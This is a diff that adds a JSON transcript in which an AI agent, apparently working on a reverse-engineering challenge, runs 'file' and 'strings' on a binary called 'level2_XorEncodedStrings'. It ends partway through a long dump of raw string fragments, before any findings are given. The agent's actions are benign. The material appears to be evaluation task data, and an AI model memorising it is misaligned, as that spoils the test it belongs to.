@@ -1,0 +1,687 @@
+[
+  {
+    "role": "user",
+    "content": "Analyze the binary file in the workspace and submit your findings using the final_answer tool. The binary is located at the path shown in the system prompt. Use the available RE tools to examine it."
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_file_0",
+        "name": "file",
+        "input": {
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHaVoKxuo1etCRezd5KgDn68tuw3/zdAVF8K4aAPsZ2fxTytyVwh9lRLENWG0M"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_file_0",
+        "content": "/workspace/level2_XorEncodedStrings: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, with debug_info, not stripped\n"
+      }
+    ]
+  },
+  {
+    "role": "assistant",
+    "content": [
+      {
+        "type": "tool_use",
+        "id": "gemini_strings_0",
+        "name": "strings",
+        "input": {
+          "path": "/workspace/level2_XorEncodedStrings"
+        },
+        "metadata": {
+          "thoughtSignature": "EjQKMgEMOdbHeBuUpROw27/1R69eRKvRt+DkwqDbz9vuKJ7SodhS95wSwXG2lkwh5B4QGh2z"
+        }
+      }
+    ]
+  },
+  {
+    "role": "user",
+    "content": [
+      {
+        "type": "tool_result",
+        "tool_use_id": "gemini_strings_0",
+        "content": "u=E1\nD$HdH+\nD$8dH+\n[]A\\\nPTE1\nu+UH\nuHdH\nD$hdH\nD$pH\nD$ dH\nATUSM\nA\\A]A^A_\n$\tA\t\n[]A\\A]\nAVAUATUSH\n[]A\\A]A^A_\nAWAVAUATUSH\nP[]A\\A]A^A_\nAVAUATUSH\nGenuun\nnteluf\nineI\nHygo@\nuine\nnGenu^H\nL$hH\n|$`L\nAuth\ncAMD\nenti\nD$hH\nnD$dD\n\\$,u\nL$ H\nD$pH\nD$xL\nH=?@\nT$pH\nD$ H\nD$ L\nL9d$\n[]A\\A]A^A_\nCent\nauls\naurH\nt$dH\nD$dD\nnD$d\nD$pI\n\\$HH\nL$0H\nT$lH\nt$xH\n|$pH\nL$0H\nD$8L\nD$@L\n\\$HL\nT$PL\nt$dL\nL$hH\nT$`f\nnD$d\nD$hD\nD$pI\n\\$@H\nL$0H\nT$lH\nt$xH\n|$pI\nL$0L\nD$8H\n\\$@L\nT$HL\nD$pH\nD$8H\nt$0I\nt$0L\nD$8H\nL$@L\nL$HH\nL$pH\n  Sh@\nai  \nangh\nD$pI\nL$0I\nL$hL\nt$dH\nnD$d\nD$hD\nL$dA\nnD$d\nnD$d\nnD$d\nnD$d\nnD$d\nnD$d\nAWHc\nAUATI\nD$PH\nt#E1\no@ H\n t2H\nATUSH\n[]A\\\nAWAVAUI\nAWAVE1\nAUE1\n t ff.\ntTL9\n})I9\n([]A\\A]A^A_\nHcD$\n([]H\nA\\A]H1\nA^A_\nAVAUATUSH\nL$(H\nD$0I\nD$0H\nD$(L\n[]A\\A]A^A_\nT$(H\n\\$8M\nD$ H\n\\$8L\n\\$ M)\n\\$8L\n\\$8H\nD$ H9\nD$ H9\nAWAVAUATUSH\nD$ H\nD$(@\nD$0H\n%t:H\ntCLc\nT$ H\nt6E1\nAWAVA\nAUATUSH\n tbdJ\n[]A\\A]A^A_\nq`E1\nbff.\nt.ff.\nB0I9\nAVAUATUSH\nD$,H\n*ff.\n,ff.\nL$ H\nl$@1\nt$0H\nt$ H\nt$8H\nd$HL\n\\$pL\n\\$pL\nT$xH\nT$xM\n\\$pH\nD$PH\nT$XH\nD$@H\n\\$pI9\n\\$ H\n\\$hL\nT$`L\n\\$ L\n\\$xH\nT$xH\n\\$xL\nD$`H\nT$xL\nT$xL\nt$pH\nD$xH\n[]A\\A]A^A_\nu{H;z\nH;z(uvH\nO(H;y ulH\nt3fH\nAVAUATL\nL9d$\n8[]A\\A]A^A_\n_pfH\n,+M9\nT$(H\nD$ L\nT$(H\nD$ L\nI9G`\nH9O`\nu`H9r\nD$ I\n[A\\A]\n[A\\A]\n,$3l$\n$3D$\nAWAVAUI\nATUSH\n[]A\\A]A^A_\n4$E1\n4#I)\nAUATUH\n[]A\\A]\n[]A\\A]\nAUATI\n,$[H\n]A\\A]A^\nATUSH\nATUSH\n[]A\\\nAWAVAUATUSH\n4$L9\nL$0H9\nD$ I\nD$0M\nL+;L\n4$L9\nH;-V\n!x+H\nT$ H)\n([]A\\A]A^A_\n([]A\\A]A^A_\nx/ujK\n$u*H\nAVAUL\nATUSH\nG`H9\nv{L;\n[]A\\A]A^\n]A\\A]A^\nAVAUA\n[]A\\A]A^\n]A\\A]A^\n[]A\\A]A^\n]A\\A]A^\nAWAVAUATUH\n\\$8H\nH;='\nu M9\nT$8dH+\nH[]A\\A]A^A_\nD$0M\n|$0E1\nD$0N\nL;=}\n\\$ L\n\\$ M\nL;=|\n|$0L\nL$(L\nD$ H\nL$(L\nD$ L\nL$(L\nD$ H\nL$(L\nD$ L\nAWAVAUATI\n|ff.\nu`E1\nw\tM9\nA(fH\n[]A\\A]A^A_\nUxL9\nqnMc\nH;Uh\nS I9\nq[Mc\nA(fH\nB H9H \nS H9\nqwMc\nq|Mc\nEpfI\nEpfI\nEhfI\nAWAVAUATUSH\n[]A\\A]A^A_\nL;-z\n4oH;5g\n$+I\t\nM9|$\nH;5z\nU H9\nAVAUATI\nt4 I\nI9M`t\n[]A\\A]A^A_\n[]A\\\ntWATE1\n%[]A\\\ntKH;-L\nH30H\nAUATUH\nH;=7\n[]A\\A]\n[]A\\A]\n[]A\\A]\n|+ 1\n]A\\A]\nAWAVAUATUH\n4wH;5\nu&H9\n([]A\\A]A^A_\nATUSdH\n[]A\\\nAWAVAUATUH\n[]A\\A]A^A_\n[]A\\A]A^A_\nr\tH)\nAUATUSH\nH30H\n[]A\\A]A^\nH;-q\n[]A\\A]A^\n[]A\\A]A^\nH;)ue\nAWAVAUATUSH\nC0L!\nH9\\$\n([]A\\A]A^A_\nAVAUATUSH\nt$XI\n)D$ \n)D$0\n)D$@ff.\noD$ A\noD$0A\noD$@A\nD$XdH+\n[]A\\A]A^\n\\$XH\nD$@f\noD$ \nD$XdH+\nAWAVAUATUSH\nl$hH\n)F A\n)F0A\nD$hdH+\nx[]A\\A]A^A_\nATUHc\n\tw\"H\n[]A\\\n[]A\\\n[]A\\\noT> \no\\>@\nod>`\noT> \no\\>@\nod>`\nm >O\ne >O\n] >O\nu %g\n(oT>\n(o\\>\n(od>\nu %g\n`}kb\n@}Nb\nu %b\ne >J\nu >J\nu >L\nu >L\n vbH\ntG f\ntW@f\nt_Pf\n;ff.\noN H\nof`H\nov@H\noN H)\no^`H\no^`H\n;ff.\noN H\nof`H\nov@H\noN H)\no^`H\no^`H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbQ|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\nbq|H\n+ff.\n@r7b\nHo&H\nHof@b\nHonAH\nHof@b\nHonAba\noAba}H\nba}H\nba}H\nba}H\n+ff.\n r7b\n(o&H\nba}(\nba}(\nba}(\nba}(\nba}(\nba}(\nba}(\nba}(\n;ff.\n)g0H\n)_0H\n)_0H\n;ff.\n(v0L\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n)_0H\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n+oPH\n%ff.\n%ff.\n|H)W\n|H)W\n|H)W\n@r!H\n r!H\n@w+b\n)B0H\noG f\noG0f\no_ f\nog0f\noZ f\noZ0f\n} tG\n} tG\n} tG\n} tG\ntP f\ntX0f\ntP f\ntX0f\no@@f\ntP f\ntX0f\nT$0dL\nT$0H\nD$ H\nAWAVAUATM\n[]A\\A]A^A_\nAUATU1\n[]A\\A]A^\nd$ H\n:-t6\nAVAUATUS1\n8ct3\n[]A\\A]A^A_\n|$xH\n\\$hH\nT$xdH+\n|$xH\n\\$hH\nT$xdH+\nwn[]\n-ju\t\nD$@dH\nD$@H\nD$ H\nATUSH\n[]A\\\nAMVS\n []A\\\n []A\\\nAWAVAUATI\nl$ H\n[]A\\A]A^A_\nl$ 1\nj*E1\nL$8L\nD$@L\n)D$P\n)L$`\n)T$p\nATUSH\n([]A\\A]\ntYH9\n<\tvEH\n[]A\\\n[]A\\\n[]A\\\n=Pj\t\nAWAVAUATUSH\n|$ H\nD$(E1\n|$ H)\nM;.s}L9\nM;.r\nl$(H\nD$(H9\n8[]A\\A]A^A_\nH9D$\n-?g\t\n<<L)\nL$ I\n[]A\\\nAUATUS1\n[]A\\A]\n-Ra\t\n[]A\\\n-0a\t\n[]A\\\n[]A\\A]\n[]A\\A]\ntpdH\nL;D1\ntVATI\n[]A\\\n[]A\\\n-z^\t\nAUATUSH\n-i^\t\n-b^\t\n+[]A\\A]A^\n=I]\t\n=0]\t\n]A\\A]A^\n|$ L\nD$(L\nD$@H\nL$@L\nL$0L\nD$(H\n|$ H\nH+%!]\t\n|$ L\nD$(L\nd$@H\nl$@L\nL$0L\nD$(H\n|$ H\nH+%Q\\\t\n|$ L\nD$(L\nd$@H\nl$@L\nL$0L\nD$(H\n|$ H\nHc7L\n|xL9\n[]A\\\nH9\\$\n[]A\\\nAVAUATI\n|$ L\n[]A\\A]A^A_\n=tAD\n<=t,<:t(\ntBff.\n.H9T$\n[]A\\A]A^A_\n=PP\t\nD$HH\nL$xH\nT$(H\n8u:H\nAWAVAUATUSH\n=UN\t\n5BK\t\n5<J\t\n56I\t\n[]A\\A]A^A_\nP(H;\n,t|H\n-ttH\nw2Ic\nAvoid_NoI3\nn_TemporI3x\nFast_UnaI3\nligned_LI3x\nFast_UnaI3\nligned_CI3x\nCopy\nFast_CopI3\ny_BackwaI3x\nFast_RepI9\np_StringI9@\nPrefer_EI9\nPrefer_FI9\nAvoid_STI9\nSlow_SSEI9\nE4_2\n%vB\t\nSlow_BSFI9\nAVX2\nBMI1\nAVX512CDI9@\nAVX512BWI9@\n?AVX5\n?OSXS\nSAVE\n%6@\t\n?POPC\n?SSE4\n?SSE4\n?XSAV\n%;@\t\n_TemporaI3@\tH\nl_MemsetI3x\n%u?\t\n512F\n%Y?\t\n%$?\t\n%\t?\t\nMathVec_I3\nPrefer_NI3x\no_AVX512I9@\n8SHST\nPrefer_NI3\no_AVX512I3x\nAVX_FastI3\n_UnalignI3x\nned_LoadI9@\nPrefer_PI3\nMINUB_foI3x\nNUB_for_I3@\nstringopI3x\nPrefer_NI3\no_VZEROUI3x\nPPER\nLoad\nERMS\nFSRM\nAVX512DQI9@\nAVX512ERI9@\nBMI2\nCMOV\n%L<\t\n%-<\t\nTOSB\nPrefer_NH3\no_AVX512L3G\n?SHST\n?LZCN\n?MOVB\n?SSSE\n?XSAV\n%;;\t\nPrefer_PH3\nMINUB_foL3G\nNUB_for_H3G\nstringopL3G\nPrefer_NH3\no_VZEROUL3G\nPPER\nMathVec_H3\nPrefer_NL3G\no_AVX512H9G\n%};\t\nAVX_FastH3\n_UnalignL3G\nned_LoadH9G\n%6;\t\n%v9\t\nAVX512PFI9@\n%W9\t\nERMSu7\n%>9\t\n%\t9\t\nFMA4u.\n%!9\t\nAVX512VLI9@\nSSE2uH\nSlow_BSFI9@\nI586u,\nI686\n%E9\t\n5=;\t\n[]A\\\nL9d$(u\n5w8\t\n[]A\\\n$dH3\nAVAUATI\n5N2\t\n-W2\t\n<+=u\n[]A\\A]A^\n]A\\A]A^\nAWAVAUATI\nl$HA\nT$HdH+\nX[]A\\A]A^A_\nT$@A\n|$ H\nt$(L\n|$ H9|$\nr,ff.\nt$(L\nT$0H\nD$8H\nT$0H\n|$8H\nD$0H\nT$(H\nL$0L\nT$(L\nT$(H\nT$(L\nD$H1\nD$HdH+\n5x0\t\nv^S1\nAWAVI\nAUATUH\n5y*\t\n8[]A\\A]A^A_\n,6I9\nD$(H\nD$ H\nT$ H\n54,\t\n=',\t\nATUSH\n[]A\\\n[]A\\\nAUATUSH\n[]A\\A]\nt+H;\nt6ff.\n=\t%\t\n=O)\t\nAWAVE1\nAUE1\n t ff.\ntLL9\n}!I9\n[]A\\A]A^A_\n<}wrL\n(ff.\nAWAVI\nATUSH\nL$ D\nD$$dH\nHcT$ L\nd$8H\nl$@H\nt$0L\nD$0H\nHcT$ H)\nD$8H\nD$(E1\nl$@H\n[]A\\A]A^A_\nHcT$ L)\nD$81\nt$01\nHcT$ H)\nAWAVM\ntNH9\n[]A\\A]A^A_\nAVAUATUSH\n|$HL\nD$xH\nD$`dH\nD$ H\nD$PH\nl$ L\nl$ I\n\\$PH9\nD$ H9\n[]A\\A]A^A_\nT$@L\nD$8M\nT$4IcD$0A\nT$@IcD$0\ntdIcD$,\nIcD$(\nt$8H\nIcT$0IcD$\n$$HcD$\nt$pL\nD$xM\nIcE(\nIcU0H\nL$hH\n\\$XD\nL$hD\n|$pH\nT$(IcU,A\nL$lA\n.Ic}\nD$hA\n|$8E\nD$@H\nD$8A\nIcE0H\nD$lH\nIcE0H\nT$0A)\ngIcE0H\nHct$\n\\$hD\nL$lD\nL$lD\n\\$@H\nD$@E\nD$8 Hc\nIcE0H\n|$@1\nD$8 Hc\\$\nL$(H\nD9d$\n\\$0E\nT$hE\n|$8 \nIcE0H\nD$@Hc\\$\nD$8 \n D$(1\nD$lD\nD$lH\nD$(D\nIcE0H\nIcE0H\nD$xH\nD$8 1\nD$8 1\n|$`D\n\"T$hA\n|$8 \n D$(\nD$(E\nL$8D\nD$8 E1\nD$()\n\\$XD\n|$8 \nL$(L\nD$`H\nD$(E1\nL$(L\nD$`H\n D$(\nD$@E1\nD$8 \n D$(\n\\$XD\n|$8 \nIcE0H\n\\$@D\nL$lH\nT$hA\nl$ 1\nD$0D\nD$0D\n|$@1\nL$(H\nD$0D\nD$0D\nD$(1\n|$hD\nD$(E1\nD$8 D\n\\$0L\nIc0L\nd$@L\nD$8L\n|$(L\nD$8 E1\nD$0D\nD$0D\nD$8 \nD$(E1\nD$0D\nD$0D\nD$0D\nD$0D\nl$0I\nD$XH\nD$0L\nIc0McL=\nD$XH\nL$0H\nATUSH\nL$TdH\nD$hH\nD$xH\nD$HH\n[]A\\A]A^A_\nD$TL\nD$ L\nD$4D\nT$(D\nL$ E\nL$ D\nT$(H\nLcd$h\nD$lH\n|$8H\nT$`D\n|$8D\nT$`D\nL$XD\n\\$dH\nD$@H)\nD$l\"D$PE\nt$(H\n\\$XD\nT$8H\nt$@H\nt$(H\nT$PA\n\\$XH\nd$4A\nL$PL\nD$HH\nT$@H\nHcl$\nD$@I\n|$(A\nL$PL\nD$HH\nT$@H\nD$8H\nL$(H\n\\$`H\nL$ddH\nD$(H\nL$XD\n\\$`H)\n|$HD\n\\$`D\nL$XH\nD$dD\n\\$`A\nL$XH\nL$8A\nD\"d$4\nT$(H\nt$@H\nD$8D\nT$P1\nD$@H\nD\"d$4E\nT$(H\nt$@H\nD$l1\nT$8D\n\\$lD\nL$`H\nt$@H\nL$XdH\nL$XD\nD$dD\n\"D$P\nD$PE\nt$8H\nD$81\nT$PH\nD$@E)\n|$hH\nT$(D\nL$ H\n\twg=\nl$pD\nL$8dH\nL$8D\nT$4D\nl$(H\nT$PH\nAWAVAUATI\nt$0H\n[]A\\A]A^A_\nt$0H\nw(Hc\nAWAVAUATM\n <)w)\nL<.w)H\n[]A\\A]A^A_\nC,H9\n{(H9\nAUATUH\nH=/\t\nU8I9\n[]A\\A]\n[]A\\A]\n[]A\\A]\nAWAVAUATI\nH=/\t\nt;L9\n[]A\\A]A^A_\nH=/\t\n~C@f\nC0[H\n]A\\A]A^\nw H9\nwiH)\nH=/\t\nd$0M\nK@H+S\nC@H+C8H9\ns@H)\n[]A\\\nd$0H\nd$0J\nH=/\t\nD$0H\nt$0H\nCpE1\nt$0H9\nH=/\t\n[]A\\\nATUSH\nH=/\t\nT$HH\n[]A\\A]\n~C8H\n~C8H\nATUSD\nCt u+H\nH=/\t\n[]A\\\nP H)\nW(H)\nAWAVAUATUSH\nD$(H\nauKA\nD$(dH+\n[]A\\A]A^A_\nD$(dH+\nD$(dH+\nP H)\n@u%H\nH=/\t\nW(H)\nAVAUATUSH\ns H=/\t\n[]A\\A]A^\n]A\\A]A^\nH=/\t\nSwH9\nH=/\t\nH=/\t\nATUS\nH9S@\n[]A\\\ns@H9\n[]A\\H)\nP H)\nH+C8L9\nw H9\nP H)\nH=/\t\nH+w8H;G\nH+C8H9\nAWAVAUATUSH\nH=/\t\nD$(%\nH=/\t\nS@H)\nH=/\t\n[]A\\A]A^A_\nCwH9\n~C8f\nH=/\t\nk(H+k H\nH=/\t\nH=/\t\nATUSH\nG@H+G8H\nH=/\t\n[]A\\\nH=/\t\ns@H)\nATUSH\nx&H)\n[]A\\A]\nAWAVAUATI\nS0H9\n[]A\\A]A^A_\nH=/\t\nK@H+K8H\n[]A\\A]A^A_\nr:I)\nAWAVAUI\ns@H)\nK0H=/\t\n[]A\\A]A^A_\n]A\\A]A^A_\n[]A\\A]A^A_\nCwH9\nAWAVI\n[]A\\A]A^A_\nH=/\t\nAUATI\nH=/\t\n[]A\\A]\nAWAVI\n_`M)\nt$XM\nL$HL\n|$PD\n8[]A\\A]A^A_\nt$ H\n4*I9\nD$wI9\n\\$`L\nM+t$\n\\$HM\n\\$XM\nD$PH\n|$HH)\n|$HM\n\\$`M\nM+t$\nt$ H\nT$(H\nt$(L\nD$wL\n\\$HM\n\\$XM\n\\$(H\nD$(dH+\n0[]A\\\nATUSH\nD$(dH+\n0[]A\\\nG(H9G s0H\nH=/\t\nCwH9\nH=/\t\nH=/\t\nCwH9\nH=/\t\nCwH9\n[]A\\A]\nATUS\nH=/\t\n[]A\\\nH=/\t\n_0H9\n[]A\\A]A^A_\nH=/\t\nucI)\n]A\\A]A^\nAUATI\nH=/\t\n[]A\\A]\nH=/\t\nATUSH\nc@[]A\\\nCwH9\nH=/\t\nH=/\t\nAVAUATUSH\nD$(1\nH H9H\nH=/\t\nC(H9C \nD$(dH+\n[]A\\A]A^\nAUATUSH\nD$(1\nH=/\t\nD$(dH+\n8[]A\\A]\nt+ff.\nAVAUATUSH\nD$(1\nCwH9\nH=/\t\nD$(dH+\n[]A\\A]A^\nt H+C\nCwH9\nAWAVAUATU\n[]A\\A]A^A_\nt1H9\nAWAVAUATA\nW@L)\n[]A\\A]A^A_\ns@L)\nC(L)\n{ L)\n[]A\\A]A^A_\nC0L9\nAVfH\n[]A\\A]A^\n[]A\\A]A^\nAWAVAUATU\nH+K L\nD$dH\n{ L)\nC(L)\nC(H9C\n[]A\\A]A^A_\nW(H9\nAVAUI\n]A\\A]A^A_\ng(L+g H\nu<AQL\nt$ I\nZYH=\nAUATUSH\ndH;<%\n[]A\\A]\nAWAVAUATUSH\nC dL\nC dH\n([]A\\A]A^A_\n+tpD\nu\\A9\n?9D$\nS dH\n?9D$\nC dH\nS dH\nuY9W\n`t.H\nG dH\n|uaH\nATUS\nuOA1\nAWAVAUATUSH\n[]A\\A]A^A_\nuFE1\n)D$ \n)D$0\n)D$@\n)D$P\n)D$`\n)D$p\nAWAVAUATA\nuRD9\n}ME9\n[]A\\A]A^A_\n`tuH\nAUATUSL\nt0L9\n[]A\\A]A^\nu<H9k\n[]A\\\n[]A\\\nAUATUSH\nOff.\n6ff.\nD$@H\n4+ff.\nD$8L\nD$0L\nt\tL9\nBD$0H\nt$(K\nL$ L\nL$ M9\ntff.\nt$8H\nl$0L\n[]A\\A]A^A_\nD$8I\nD$(H\nD$ O\nD$ I\n|$(H\nt$0I\nAWAVAUATUSH\nK9D%\n[]A\\A]A^A_\n[]A\\A]A^A_\n} tG\n} tG\n} tG\n} tG\nu&,`r\n} tG\n} tG\ntg`b\n} tG\n} tG\n} t@\n} tG\n} tG\n} tG\n} tG\nu&,`r\n} tG\n} tG\n} t_\n} tG\n} tG\n} t@\no_ f\nog0f\no_ f\no_0f\no_ f\nog0f\no_ f\ntO0f\n ~[f\no_ f\ntO0f\n!@:4\nA@:4\na@:4\n?@:4\n_@:4\n!@:4\nA@:4\na@:4\n?@:4\n_@:4\n@:0u\n@80H\noG f\noG0f\no_ f\nog0f\n@80H\noZ f\noZ0f\n}\"tN\n}\"tN\n}\"tN\nb!m \nb!M \nu %v\n}\"tL\n}\"tN\n}\"tL\n}\"tL\nb!M \nU %v\n0w:f\noo f\noV f\nog0f\noF0f\noj f\nor0f\noP f\noX0f\nu[H9\nA H9\nv@A)\nu`H9\nA H9\nv@A)\n}\"tN\n}\"tN\n}\"tN\nb!m \nb!M \nu %v\n@v7b\n}\"tL\n}\"tN\n}\"tL\n}\"tL\nudH9\nb!M \nU %v\nA H9\nv?A)\n0wDf\nsBI)\nrBH)\nrCH)\nwff.\n} tG\n} tG\n} tG\n} tG\nu6H=\n} tG\n} tG\n} tG\n} tG\nubH=\n v?H\n v*H\ntP f\ntX0f\ntP f\ntX0f\ntP f\ntX0f\ntP f\ntX0f\n(_ f\nt9:P\n'ff.\no_ f\nog!f\noG0f\no_1f\nt!:P\now?f\noWPf\no_OfD\noO`fA\noGpH\noo/f\nt$:Q\noh f\noh0f\no`/f\ntbH9\nt(:P\nAUATUSH\nd$PfH\nl$hH\nT$@H\n)D$ dH\nt$ j\nD$ H\nl$ M)\nD$hdH+\n[]A\\A]\nt$ H\nAWAVAUATSH\ng dL\n[A\\A]A^A_]\nAVE1\nAUATL\ntbE1\n []A\\A]A^\nAVAUI\nATUH\nL$PdH\n\\$(t\nl$0H\nt$0L\nt$8H\nL$@^\n[]A\\A]A^A_\nt$ L\nD$PH\nD$(H\nD$(H\nD$PH\nD$8H\nD$0H\nl$0M\nT$@AXAYH\nAVAUATA\n/POSIX_VH\n[A\\A]A^A_]\nAUATUS\nT$8dH+\nH[]A\\A]\nD$8dH+\n[]A\\A]\nD$8dH+\nD$8dH+\nH[]A\\A]\nD$8dH+\nD$8dH+\nH[]A\\A]\nD$8dH+\nH[]A\\A]\nD$8dH+\nH[]A\\A]\nD$8dH+\nD$8dH+\nT$0dH\nHcL$0H\nD$ H\nT$@dH\nD$(1\nD$0H\nT$(dH+\n[]A\\\n[]A\\\ntvUSI\nAWAVAUATUSH\n[]A\\A]A^A_\nATUSH\n[]A\\\n[]A\\\nAWAVAUATSH\n[A\\A]A^A_]\nUff.\ntKUSH\nAWAVAUATI\nl$8H\nD$(L\n|$ H\nD$(H;D$\n8-u|\nT$0H;T$(taH\n: uSM9\nru2H\n-u#M9\nrUL)\nT$8dH+\nH[]A\\A]A^A_\nD$0H\nD$,H\nD$8dH\nD$0dH\nH9T$\n []A\\\nAWAVA\n[]A\\A]A^A_\nAWAVI\nAUATUSH\nL$HL\nD$PL\nL$XH\nD$ H\nD$0H\nD$(A\nD$ H\nD$0H\nD$(A\ntA<%u\nh[]A\\A]A^A_\n<zu`A\nT$ H\nT$ H\nT$ H\nh[]A\\A]A^A_\nT$ H\nAUATI\n[]A\\A]\n<9~o\nA<9w\n[]A\\A]\n[]A\\A]\n[]A\\A]\nAWAVAUATSH\n2ff.\n[A\\A]A^A_]\n.t.@\ntwI9\n/t'@\nt\"I9\nAWAVI\nAUATSH\nuffA\n[A\\A]A^A_]\nCff.\n[]A\\\nAWAVAUATSH\n[A\\A]A^A_]\nAUATUH\n[]A\\A]\n[]A\\A]\nAUATU1\n]A\\A]A^\n]A\\A]A^\nAUE1\n[]A\\A]A^A_\nAUATI\n[]A\\A]\n[]A\\A]\n[]A\\A]\nAWAVAUATUH\nD$HH\n|$HH\nL$@L\nD$0L\nL$(H\n|$(L\ntwM9t$ u\nD$0H\nD$ H\nL$ I\nD$8H\nt$ s\nD$(H\nD$@I\n|$8H\nT$ L\nX[]A\\A]A^A_\nAWAVAUI\nATUH\n[]A\\A]A^A_\n[]A\\A]A^A_\nkff.\nphE1\nAUATI\n uXH\n[A\\A]]\n[A\\A]]\nAWAVI\nAUATM\nH0M!\n@bQs\noH H\nT$0A\n<$H9\nT$0M\nL$(H)\nH0fH\n[A\\A]A^A_]\nT$(I\nF(H9\n=ff.\nT$0E1\nAWAVAUATUSH\n%ff.\n[]A\\A]A^A_\nD$HI\nD$`H\nL$$H\nD$HI\nD$`H\nD$GPUH\nD$`H\nT$G1\nt$ L\nD$`H\nD$GP\nD$XH\nD$`H\n\\$ I\nd$0L\nD$GL\nt$(H\n|$0L\nD$(I9\nT$(H\n\\$ L\nd$0L\nd$ H\nl$(I\nd$ L\n\\$ L\nD$`L\nD$GPUL\nL$`H\nT$GH\nAXAY\nL$`L\nT$ I\nT$GI\nT$ u(\n|$PE1\n\\$PL\nD$`L\nD$GH\nPARH\nAXAY\nd$ L\nAWAVAUA\n([]A\\A]A^A_\nT$0D\nuM[H\n]A\\A]A^\n]A\\A]A^\nD$PH\nD$H1\nAWAVAUATA\nT$(H\nD$ M\nX(L9\nL$8L\nT$0L\nL$8L\nT$0L\nd$8L\nl$tH\nl$xI\nt$0L\nT$@D\nSAWPD\nt$@H\nt$0D\nd$8H\nT$@D\nL$Hf\n[]A\\A]A^A_\nt$@H\nt$8L\nD$tL\nT$HI\nD$0L\nt$8L)\nRQSAWPH\nD$hD\nt$@H\n|$8L\nt$@L\nT$HD\nL$@H\nL$8L\nT$0L\nL$@D\nL$8L\nT$0L\n|$HL\nL$(H\nD$0H\nL$ I\nD/(L\nt$8H\nL$ L\nL$PH\nD$(I\nD$(L\nD$ D\nL$dH\n\\$XH\nt$hI\nD$ L\nL$dH\nL$PH\n\\$XE\nt$0D\nd$8L\nT$@D\nL$xH\n|$8L\nT$0L\nL$PH\n\\$XL\nD$ H\nt$hH\nL$dI\n|?`H\nD$HH\nt$0H\nD$8H\n|$@H\n*ff.\nD$(H\nt$@L\nT$HD\nL$@H\nL$8L\nT$0L\nT$0D\nL$8L\nL$XL\nD$PH\nD$PH\nL$ H\nL$XH\nL$ I\nL$ H\nD$8H\nt$0L\nL$PL\nL$ I\nL$ I\nD$(M\nD$(D\nL$PH\nL$ L\nL$ H\nAWAVAUATI\nD$XH\n|$`H\nT$ H\nt$XL\n)D$`I\nl$`H\nT$ H\nL$hH\n[]A\\A]A^A_\nt$pL\nl$0f\n|$ D\nL$8I\nt$(M\n)D$pL\nAUAWSRL\nD$@H\nl$0L\nL$8t\n$H9D$xt\nD$XH\nD$(t\nL$HD\nD$DH\nL$HH\n|$8D\nD$DL\nD$0H;\n9D$ syH\nT$ H\nL$ H\nL$ E\nL$0H\nL$0H\nD$ E\nD$ N\nL$ A\nL$DJ\nL$8H\nD$0H\nL$DH\nL$8L\nL$ H\nL$ A\nL$ I\nu!E1\nL$HD\nD$DH\nL$HH\n|$8D\nD$DH\nt{L9\ntnE1\ntYH9\nL9t$0D\n\\$ E9\n[]A\\A]\nt$0H\nXff.\n0tX1\n[]A\\H\nAUATA\n[]A\\A]A^A_\n*ff.\n[]A\\\n[]A\\\n[]A\\\n[]A\\\nAWAVAUATUSH\nt$.Hc\n<%t\\<\n[]A\\A]A^A_\n<lt{<ztw<s\nLcD$\nLcD$\nt$(H\nT$0H\nL$8L\nD$@L\n)D$P\n)L$`\n)T$p\nt$(H\nT$0H\nL$8L\nD$@L\n)D$P\n)L$`\n)T$p\nT$0H\nL$8L\nD$@L\n)D$P\n)L$`\n)T$p\nt$(H\nT$0H\nL$8L\nD$@L\n)D$P\n)L$`\n)T$p\nt$(H\nT$0H\nL$8L\nD$@L\n)D$P\n)L$`\n)T$p\nt$(H\nT$0H\nL$8L\nD$@L\n)D$P\n)L$`\n)T$p\nrQH)\nATHc\nAWAVAUATS\n'ff.\nt\"ff.\nt$pf\nT$pH\nD$hA\nt]M9\nD$PH\n[A\\A]A^A_]\nD$hA\n_AXE1\n&ff.\nAXAYH\nD$hH\nT$hH\nD$hA\nXYE1\nj\tE1\nD$hH\nT$hH\nDff.\nt$(H\nT$hH\n^tHH\n1w)H\nu6E1\nu6E1\n[]A\\\nw1ff.\nw0ff.\nAWAVAUATUSH\n[]A\\A]A^A_\n[]A\\A]A^A_\nglibc-ldH3\n.so.cachH3W\nld.so-1.H9\n.7.0\nglibc-ldH3\n.so.cachH3J\ne1.1\ne1.1\n#ff.\nAWAVAUATSH\nS0dH3\ntr9]\n<$-u\nt2ff.\nD$ A\nt$(H\nt$8I\nD$@H\nt$0dH34%0\nD$ H\nL;;r\n[A\\A]A^A_]\nAWAVAUATUSH\nl$(H\nT$(dH+\n8[]A\\A]A^A_\nAWAVI\nAUATI\nl$(E\nT$(dH+\n8[]A\\A]A^A_\n[]A\\A]\n[]A\\A]\nAWAVAUATSH\n[A\\A]A^A_]\nAWAVAUI\nATUSH\n[]A\\A]A^A_\noC H\n[]A\\A]A^A_\nAUATSH\n2ff.\nuKff.\n[A\\A]A^A_]\nAVH)\n[]A\\A]A^\n[]A\\A]A^\nAWAVAUATUSH\nt$8H\nl$0L\nd$(ff.\n\\$(I\n t(ff.\n]ff.\n;modu\n\\$(H\nD$8dH+\nH[]A\\A]A^A_\n;aliau\n4ff.\nH9\\$\n$x'H\nAWAVAUATUSH\n[]A\\A]A^A_\n|$ 